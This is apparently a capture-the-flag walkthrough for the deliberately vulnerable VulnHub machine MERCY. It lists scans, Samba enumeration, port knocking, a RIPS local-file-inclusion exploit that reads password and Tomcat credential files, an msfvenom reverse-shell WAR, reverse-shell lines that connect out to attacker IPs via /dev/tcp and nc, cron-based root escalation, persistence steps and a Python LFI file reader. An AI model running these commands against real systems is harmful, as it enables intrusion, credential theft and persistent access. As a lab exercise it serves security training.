<https://hackso.me/digitalworld.local-mercy-walkthrough/>
<https://www.hackingarticles.in/mercy-vulnhub-walkthrough/>
<https://donavan.sg/blog/index.php/2019/04/06/building-vulnerable-machines-part-2-a-torment-of-a-journey/>
<https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/>
<https://www.sevenlayers.com/index.php/143-vulnhub-mercy-walkthrough>


# Description :

MERCY is a machine dedicated to Offensive Security for the PWK course, and to a great friend of mine who was there to share my sufferance with me. :-)

MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): 
Mercy is: 

    (#1): what you always plead for but cannot get, 
    (#2): a dubious machine, 
    (#3): https://www.youtube.com/watch?v=c-5UnMdKg70

Note: Some report a kernel privilege escalation works on this machine. If it does, try harder! There is another vector that you should try!



# Steps :

- User tomcat to find password for samba
- Login to share through samba
- port knock by exposed config on samba
- Exploit new found LFI on apache
- Read tomcat config file and upload shell

# Scan NMAP
```console

└─$ sudo nmap -sT -A -Pn -n -p- 192.168.56.104
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 14:34 CEST
Nmap scan report for 192.168.56.104
Host is up (0.00078s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES CAPA SASL TOP STLS PIPELINING UIDL AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: more IMAP4rev1 ENABLE SASL-IR IDLE have post-login LOGIN-REFERRALS listed Pre-login OK capabilities LOGINDISABLEDA0001 ID LITERAL+ STARTTLS
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imaps?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
MAC Address: 08:00:27:65:B3:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m02s, deviation: 4h37m06s, median: 1h59m56s
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2021-04-15T22:35:01+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-15T14:35:00
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 192.168.56.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.41 seconds

```
 # Web service

```console



└─$ curl http://192.168.56.104:8080/tryharder/tryharder | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   621  100   621    0     0   606k      0 --:--:-- --:--:-- --:--:--  606k
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.  
```

=> Password : password


# Samba

```console

└─$ enum4linux -a 192.168.56.104
[+] Attempting to map shares on 192.168.56.104
//192.168.56.104/print$ Mapping: DENIED, Listing: N/A
//192.168.56.104/qiu    Mapping: DENIED, Listing: N/A
//192.168.56.104/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\pleadformercy (Local User)
S-1-22-1-1001 Unix User\qiu (Local User)
S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
S-1-22-1-1003 Unix User\fluffy (Local User)
```

## Get files from Samba service

```console


└─$ smbclient --user=qiu //192.168.56.104/qiu
Enter WORKGROUP\qiu's password: password 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 31 21:07:00 2018
  ..                                  D        0  Mon Nov 19 17:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 15:19:34 2018
  .public                            DH        0  Sun Aug 26 16:23:24 2018
  .bash_history                       H      163  Fri Aug 31 21:11:34 2018
  .cache                             DH        0  Fri Aug 31 20:22:05 2018
  .private                           DH        0  Sun Aug 26 18:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 15:19:34 2018
  .profile                            H      675  Sun Aug 26 15:19:34 2018



└─$ cat .bash_history                                              
exit
cd ../
cd home
cd qiu
cd .secrets
ls -al
cd .private
ls
cd secrets
ls
ls -al
cd ../
ls -al
cd opensesame
ls -al
./configprint
sudo configprint
sudo su -
exit


└─$ cat configprint         
#!/bin/bash

echo "Here are settings for your perusal." > config
echo "" >> config
echo "Port Knocking Daemon Configuration" >> config
echo "" >> config
cat "/etc/knockd.conf" >> config
echo "" >> config
echo "Apache2 Configuration" >> config
echo "" >> config
cat "/etc/apache2/apache2.conf" >> config
echo "" >> config
echo "Samba Configuration" >> config
echo "" >> config
cat "/etc/samba/smb.conf" >> config
echo "" >> config
echo "For other details of MERCY, please contact your system administrator." >> config

chown qiu:qiu config



[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn
[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn
[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

# Knock port

```console

for p in 159 27391 4; do nc -vz 192.168.56.104 $p; done
for p in 17301 28504 9999; do nc -vz 192.168.56.104 $p; done

```

# nmap again

```console

└─$ sudo nmap -p 80,22 -sV 192.168.56.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 15:29 CEST
Nmap scan report for 192.168.56.104
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 08:00:27:65:B3:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```

# Explore web service

```console

└─$ curl http://192.168.56.104/robots.txt                          
User-agent: *
Disallow: /mercy
Disallow: /nomercy


└─$ curl http://192.168.56.104/mercy/index
Welcome to Mercy!

We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.

└─$ curl http://192.168.56.104/nomercy
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.56.104/nomercy/">here</a>.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at 192.168.56.104 Port 80</address>
</body></html>

curl http://192.168.56.104/nomercy/ | grep rip

```
=> RIP 0.53 installed


# Faille

```console
    └─$ searchsploit RIPS
    ----------------------------------------------------------- ---------------------------------
     Exploit Title                                             |  Path
    ----------------------------------------------------------- ---------------------------------
    RIPS 0.53 - Multiple Local File Inclusions                 | php/webapps/18660.txt
```


# Exploit  faille RIPS 0.53

```console
    curl http://192.168.56.104/nomercy/windows/code.php?file=../../../../../../etc/passwd

    root:x:0:0:root:/root:/bin/bash
    ...
    tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
    pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
    qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
    thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
    fluffy:x:1003:1003::/home/fluffy:/bin/sh 
```

# Tomcat installed on port 8080

```console

    curl http://192.168.56.104:8080
    If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!

    This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat7/webapps/ROOT/index.html

    Tomcat7 veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat7 and CATALINA_BASE in /var/lib/tomcat7, following the rules from /usr/share/doc/tomcat7-common/RUNNING.txt.gz.

    You might consider installing the following packages, if you haven't already done so:

    tomcat7-docs: This package installs a web application that allows to browse the Tomcat 7 documentation locally. Once installed, you can access it by clicking here.

    tomcat7-examples: This package installs a web application that allows to access the Tomcat 7 Servlet and JSP examples. Once installed, you can access it by clicking here.

    tomcat7-admin: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

    NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat7/tomcat-users.xml.


    curl http://192.168.56.104/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml

    <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
    <user username="fluffy" password="freakishfluffybunny" roles="none"/> 

    
```


Admin : thisisasuperduperlonguser / heartbreakisinevitable

## Upload shell via tomcat


```bash
   
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o revshell1.war

```

## Escalation privileges and get root

### SUID

```console
    python -c "import pty;pty.spawn('/bin/sh')"
    $ id
    uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
    $ su qiu
    Password: password
    qiu@MERCY:/etc$ id
    uid=1001(qiu) gid=1001(qiu) groups=1001(qiu)
    qiu@MERCY:/etc$ su fluffy                        
    Password: freakishfluffybunny
    $ id
    uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
    cat /home/fluffy/.private/secrets/timeclock
    #!/bin/bash

    now=$(date)
    echo "The system time is: $now." > ../../../../../var/www/html/time
    echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
    chown www-data:www-data ../../../../../var/www/html/time
    cp /bin/sh /tmp/shell
    chmod u+s /tmp/shell
    chown root:root /tmp/asroot-32
    chmod 4755 /tmp/asroot-32
    #rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.1 4321 >/tmp/f
    /bin/bash -i > /dev/tcp/192.168.110.1/7321 0<&1 2>&1

    $ /tmp/launcher-32
    root@MERCY:~# id
    uid=0(root) gid=0(root) groups=0(root),1003(fluffy)
    crontab -l
    */3 * * * * bash /home/fluffy/.private/secrets/timeclock
    */5 * * * * bash /home/qiu/.private/opensesame/configprint
```

### netcat 

```console

    echo "mknod backpipe p; nc 192.168.56.1 4321 0<backpipe | /bin/bash 1>backpipe" >> timeclock

```

## Author secret

    Hi! Congratulations on being able to root MERCY.

    The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

    The author would also like to thank a great friend who he always teases as "plead for mercy". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.

    The author, as "plead for mercy" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)

    You'll always be remembered, "plead for mercy", and Offensive Security, for making me plead for mercy!

    Congratulations, once again, for you TRIED HARDER!


### /etc/ssh/sshd_config

```bash
root@MERCY:/etc/ssh# cat sshd_config
  
    AllowUsers pleadformercy
    
```

### iptables

```bash
# iptables -L
iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  192.168.56.1         anywhere             tcp dpt:ssh
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
REJECT     tcp  --  anywhere             anywhere             tcp dpt:ssh reject-with icmp-port-unreachable
REJECT     tcp  --  anywhere             anywhere             tcp dpt:http reject-with icmp-port-unreachable

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination   

```
iptables -A INPUT -p tcp -i eth0 --dport ssh -j ACCEPT


iptables -I INPUT -s 192.168.56.1 -p tcp --dport 22 -j ACCEPT

iptables -A INPUT -p tcp -s 192.168.56.1 --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT



# Persistance
```bash
# modified sshd_config
root@MERCY:/etc/ssh# cat sshd_config
  
    AllowUsers pleadformercy qiu
# Allow 192.168.56.1 access to ssh service
service iptables-persistent save

/usr/sbin/addgroup admin
/usr/sbin/usermod -a -G admin qiu

```




# Plus : script in python


```python

#!/usr/bin/python3
import requests as req
import re

host='http://192.168.56.104/nomercy/windows/code.php?file=../../../../../../../../..'

while True:
    command=input("file: ")
    combined=host+command
    resp = req.get(combined)
    content = resp.text
    stripped = re.sub('<[^<]+?>', '', content)
    clean = re.sub('<?', '', stripped)
    print(clean)

```
